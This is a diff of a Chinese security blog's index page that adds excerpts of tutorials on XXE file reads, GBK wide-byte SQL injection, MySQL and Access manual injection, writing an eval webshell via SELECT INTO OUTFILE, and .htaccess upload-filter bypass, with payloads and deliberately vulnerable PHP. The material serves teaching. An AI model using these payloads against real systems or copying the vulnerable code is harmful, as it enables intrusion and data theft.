@@ -209,6 +209,576 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/XXE%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/XXE%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">XXE注入</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-14 11:05:43 / 修改时间：11:32:05" itemprop="dateCreated datePublished" datetime="2020-01-14T11:05:43+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XXE%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index">
+                    <span itemprop="name">XXE注入</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="XXE注入攻击简介"><a href="#XXE注入攻击简介" class="headerlink" title="XXE注入攻击简介"></a>XXE注入攻击简介</h3><p>XXE Injection即XML External Entity Injection，也就是XML外部实体注入攻击。漏洞是在对非安全的外部实体数据进⾏行处理时引发的安全问题。<br>在XML1.0标准里，XML文档结构里定义了实体(entity)这个概念。实体可以通过预定义在文档中调用，实体的标识符可访问本地或远程内容.如果在这个过程中引入了“污染”源，在对XML文档处理后则可能导致信息泄漏等安全问题。<br>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、拒绝服务攻击、攻击内网网站等危害。</p>
+<h3 id="XXE注入利用"><a href="#XXE注入利用" class="headerlink" title="XXE注入利用"></a>XXE注入利用</h3><p>首先存在漏洞的web服务一定是存在XML传输数据的，可以在http头的Content-Type中查看，也可以根据url一些常见的关键字进行判断测试，例如wsdl（web服务描述语言）。或者一些常见的采用XML的java服务配置文件（spring，struts2）。不过现实中存在的大多数XXE漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机。</p>
+<h4 id="简单检测"><a href="#简单检测" class="headerlink" title="简单检测"></a>简单检测</h4><p>Payload如下：</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE any[
+&lt;!ENTITY test &quot;this is a test&quot;&gt;
+]&gt;
+&lt;root&gt;&amp;test;&lt;/root&gt;</code></pre>
+<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>Payload如下：</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  
+&lt;!DOCTYPE ANY [  
+&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;  
+]&gt; 
+&lt;root&gt;&amp;test;&lt;/root&gt;</code></pre>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/XXE%E6%B3%A8%E5%85%A5/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">宽字节注入</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-14 10:59:18 / 修改时间：11:02:54" itemprop="dateCreated datePublished" datetime="2020-01-14T10:59:18+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>在使用PHP和MySQL时，设置“setcharacter_set_client=gbk”时可能会导致宽字节注入。宽字节注入的原理是这样子的，当提交1.php?id=1时，假如Mysql语句为“select * from user where id=’1’”，当参数使用了addslashes()、mysql_escape_string()或者GPC开关来过滤单引号（’）、双引号（”）、反斜杠（\）和NULL字符，会在这些符号前面加上反斜杠加以转义，如下：</p>
+<pre><code class="php">    &lt;?php  
+    header(&quot;Content-Type: text/html; charset=utf-8&quot;);  
+    $conn = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;);  
+    mysql_select_db(&quot;test&quot;, $conn);  
+    mysql_query(&quot;SET NAMES GBK&quot;, $conn);    //不安全的编码方式  
+
+    $id = addslashes($_GET[&#39;id&#39;]);          //不安全的转义函数  
+    $sql = &quot;select * from test where id=&#39;$id&#39;&quot;;  
+    $query = mysql_query($sql, $conn);  
+    if($query == True)  
+    {  
+        $result = mysql_fetch_array($query);  
+        $user = $result[&quot;user&quot;];  
+        $email = $result[&quot;email&quot;];  
+
+        print_r(&#39;用户名： &#39; . $user . &#39;&lt;br /&gt;&#39;);  
+        print_r(&#39;邮  箱： &#39; . $email . &#39;&lt;br /&gt;&#39;);  
+        $sql = mb_convert_encoding($sql, &quot;UTF-8&quot;, &quot;GBK&quot;);  
+        print_r(&#39;&lt;br /&gt;SQL语句：&#39; . $sql);  
+
+    }  
+
+    mysql_close($conn);  
+    ?&gt;</code></pre>
+<p><img src="http://static.zybuluo.com/xmy2017/bl96sy1jzbfxy8njiiy9nsyr/image_1bfrcfjceb4615p1adt1p7fbei9.png" alt="image_1bfrcfjceb4615p1adt1p7fbei9.png-30.7kB"></p>
+<p>单引号没有闭合，无法实现注入。我们在参数后面加上%df%27，即可把程序中转义的\（%5c）吃掉。这是因为%df和\组合成了%df%5c，解码成了“運”字，后面的%27（单引号）没有被转义，成功实现了闭合。如下：<br><img src="http://static.zybuluo.com/xmy2017/nt3dex9hvanmum0crsbvg6p9/image_1bfrcg7q7iue2qh5t9otrmsm.png" alt="image_1bfrcg7q7iue2qh5t9otrmsm.png-29.4kB"></p>
+<p>漏洞的产生是因为在PHP连接Mysql时执行了“setcharacter_set_client=gbk”，比如“SET NAMES GBK”，实际上是执行了如下操作：<br>set character_set_connection = gbk,<br>set character_set_results=gbk,<br>set character_set_client=gbk<br>而mysql_set_charset(‘gbk’)实际上是调用了SET NAMES，因此也存在漏洞。同样的编码转换函数iconv()、mb_convert_encoding()等也会产生漏洞。</p>
+<p> 漏洞的防范方法有以下几种：<br>1） 在执行查询之前执行如下操作：SET NAMES GBK; character_set_client=binary。<br>2） 使用mysql_real_escape_string()安全转义函数进行参数过滤。<br>3） 使用pdo方式预编译处理数据库查询。</p>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Mysql%E5%AF%BC%E5%87%BA%E4%B8%80%E5%8F%A5%E8%AF%9D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/Mysql%E5%AF%BC%E5%87%BA%E4%B8%80%E5%8F%A5%E8%AF%9D/" class="post-title-link" itemprop="url">Mysql导出一句话</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-14 10:44:59 / 修改时间：10:49:19" itemprop="dateCreated datePublished" datetime="2020-01-14T10:44:59+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>执行语句如下：</p>
+<pre><code class="php+HTML">create table yjh(cmd varchar(50));
+insert into yjh(cmd) values(&#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;);
+select cmd from yjh into outfile &#39;D:/www/example/cmd.php&#39;;
+drop table yjh;</code></pre>
+<p>要求mysql启用secure-file-priv特性。secure-file-priv参数是用来限制LOAD DATA，SELECT … OUTFILE，LOAD_FILE()传到指定目录的，secure-file-priv状态如下：<br>● null，表示不允许导入/导出，默认状态为null；<br>● 具体目录（如/tmp/），表示限制mysql的导入/导出只发生在该目录下；<br>● 没有具体的值，表示不对mysql的导入/导出做出限制。</p>
+<p>启用secure-file-priv的方法：<br>● Windows下，修改my.cnf 在[mysqld]内加入secure_file_priv =<br>● Linux下，修改my.cnf 在[mysqld]内加入secure_file_priv =</p>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/Mysql%E5%AF%BC%E5%87%BA%E4%B8%80%E5%8F%A5%E8%AF%9D/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/13/MySQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/13/MySQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">MySQL注入</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-13 17:31:17 / 修改时间：18:33:43" itemprop="dateCreated datePublished" datetime="2020-01-13T17:31:17+08:00">2020-01-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="MySQL的一些特性"><a href="#MySQL的一些特性" class="headerlink" title="MySQL的一些特性"></a>MySQL的一些特性</h3><p>MySQL的注入比Access好玩得多，这是基于MySQL的特性而定的。看一下MySQL的一些特性：<br>●MySQL通常搭配PHP使用，所以PHP的网站一般都是使用MySQL数据库；<br>●MySQL的数据库文件通常存储在数据库安装路径下，后缀格式是myi，myd，frm；<br>●MySQL有管理员用户名和密码，超级用户是root；<br>●MySQL 5.0以上版本有information_schema数据库，存储着所有数据库下的表名和列名信息。<br>MySQL可以使用和Access一样的猜解方法，但我们通常不会这样做，因为MySQL可以暴力破解数据库的很多信息。</p>
+<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>判断注入点需要具体情况具体分析，这里不做介绍。在这里使用我自己写的一个页面来演示。注入点是：<a href="http://localhost/test/injection.php?id=1" target="_blank" rel="noopener">http://localhost/test/injection.php?id=1</a><br><img src="http://static.zybuluo.com/xmy2017/490m31t8kx00cccg0v4eqr74/1.png" alt="1.png-17kB"> </p>
+<h3 id="判断当前数据表列数"><a href="#判断当前数据表列数" class="headerlink" title="判断当前数据表列数"></a>判断当前数据表列数</h3><p>使用order by语句来判断当前数据表的列数，语句如下：</p>
+<pre><code>order by N</code></pre>
+
+<p>N是1，2，3…N，直到页面返回出错，那前面一个数字就是当前数据表的列数。<br>判断当前数据表的列数：<br><img src="http://static.zybuluo.com/xmy2017/gteaqk3s6zfq4hkvlh9bkefa/2.png" alt="2.png-41.6kB"><br>当前数据表的列数是7。<br>我们也可以使用union语句来判断当前数据表的列数，语句如下：</p>
+<pre><code>and 1=2 union select 1,2,3…</code></pre>
+
+<p>一直增加数字，返回的页面都是出错的，直到返回的页面看到一些数字为止：<br><img src="http://static.zybuluo.com/xmy2017/9y80j21sfuvdg4u7jf496eoh/3.png" alt="3.png-17.1kB"><br>我们可以看到2，5，6这三个奇怪的数字，这三个数字接下来很有用处。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/13/MySQL%E6%B3%A8%E5%85%A5/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/13/Access%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/13/Access%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">Access注入</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-13 16:58:44 / 修改时间：17:26:53" itemprop="dateCreated datePublished" datetime="2020-01-13T16:58:44+08:00">2020-01-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="Access的一些特性"><a href="#Access的一些特性" class="headerlink" title="Access的一些特性"></a>Access的一些特性</h3><p>Access的一些特性如下：<br>●Aceess通常搭配ASP网站；<br>●Access的数据库文件存放在网站目录下（通常是database或者db目录），后缀格式通常是mdb（也可能是asp或者asa）。我们可以想办法下载数据库文件。<br>●Access数据库没有用户名和密码，也没有数据库名。</p>
+<h3 id="Access手工注入"><a href="#Access手工注入" class="headerlink" title="Access手工注入"></a>Access手工注入</h3><p>Access注入的步骤通常如下：<br>（1）.判断注入点<br>（2）.猜解表名<br>（3）.猜解列名<br>（4）.猜解内容</p>
+<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>判断注入点有很多种方法，要根据具体情况使用，所以这里也不详细解释。</p>
+<h4 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h4><p>Access的表名和列名都只能靠猜。表名的猜解使用exists函数，猜解语句如下：</p>
+<pre><code>and exists(select * from 表名)</code></pre>
+
+<p>如果返回正常，说明数据库中有这个表。<br>猜解是否有user表：<br><img src="http://static.zybuluo.com/xmy2017/vanlgelocnslo0ks81eiccog/1.png" alt="1.png-34.6kB"><br>显示出错，说明没有user表。<br>猜解是否有admin表：<br><img src="http://static.zybuluo.com/xmy2017/lrve5pbr4w72pwac8njkahkp/2.png" alt="2.png-291.2kB"><br>很明显，有admin这个表。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/13/Access%E6%B3%A8%E5%85%A5/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/11/htaccess%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8A%E4%BC%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/11/htaccess%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">.htaccess绕过黑名单上传</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-01-11 18:35:58" itemprop="dateCreated datePublished" datetime="2020-01-11T18:35:58+08:00">2020-01-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-01-14 10:57:12" itemprop="dateModified" datetime="2020-01-14T10:57:12+08:00">2020-01-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">文件上传</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<sup>[1]</sup><br>在文件上传使用扩展名黑名单且没有过滤.htaccess的情况下，可以使用.htaccess文件绕过上传限制。<br>测试上传功能的代码如下：</p>
+<pre><code class="php">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;form action=&quot;&quot; enctype=&quot;multipart/form-data&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;upload&quot;&gt;
+&lt;/form&gt;
+&lt;?php 
+$black_list = array(&#39;html&#39;, &#39;htm&#39;, &#39;php&#39;, &#39;php2&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;txt&#39;);
+if(isset($_FILES[&#39;file&#39;]))
+{
+    $file_name = $_FILES[&#39;file&#39;][&#39;name&#39;];
+    $file_path = &#39;images/&#39; . $file_name;
+    $file_ext = substr($file_name, strrpos($file_name, &#39;.&#39;)+1);
+    $file_tmp = $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];
+    foreach($black_list as $key=&gt;$value)
+    {
+        if($value == strtolower($file_ext))
+        {
+            echo &quot;不允许上传的文件类型！&quot;;
+            exit(0);
+        }
+    }
+
+    if(!move_uploaded_file($file_tmp, $file_path))
+    {
+        echo &quot;文件上传失败！&quot;;
+    }
+    else
+    {
+        echo &quot;文件上传成功，文件路径为&quot; . $file_path;
+    }
+}
+?&gt;</code></pre>
+<p>新建.htaccess文件内容如下：</p>
+<pre><code class="html">&lt;FilesMatch &quot;lala&quot;&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;</code></pre>
+<p>上传该文件，由于文件扩展名不在黑名单中，所以可以上传成功：<br><img src="http://static.zybuluo.com/xmy2017/01ud0mg1ecckbsmvfgh0kjzk/1.png" alt="1.png-24.9kB"><br>接着上传一个文件名包含“lala”且没有扩展名一句话木马文件：<br><img src="http://static.zybuluo.com/xmy2017/tcu7n64hghwlnjpjclc6xeug/2.png" alt="2.png-25.2kB"><br>两个文件都能上传成功，使用菜刀连接lala文件：<br><img src="http://static.zybuluo.com/xmy2017/jnt9ctkvkwl3e5g62yvlze1k/3.png" alt="3.png-75.3kB"><br>所以在使用黑名单过滤且未包含htaccess扩展名的情况下，.htaccess通常是个大杀器。</p>
+<p>参考：<br>[1]百度百科：<a href="https://baike.baidu.com/item/htaccess/1645473" target="_blank" rel="noopener">https://baike.baidu.com/item/htaccess/1645473</a></p>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/11/htaccess%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8A%E4%BC%A0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/11/hello-world/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -352,20 +922,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-count">27</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
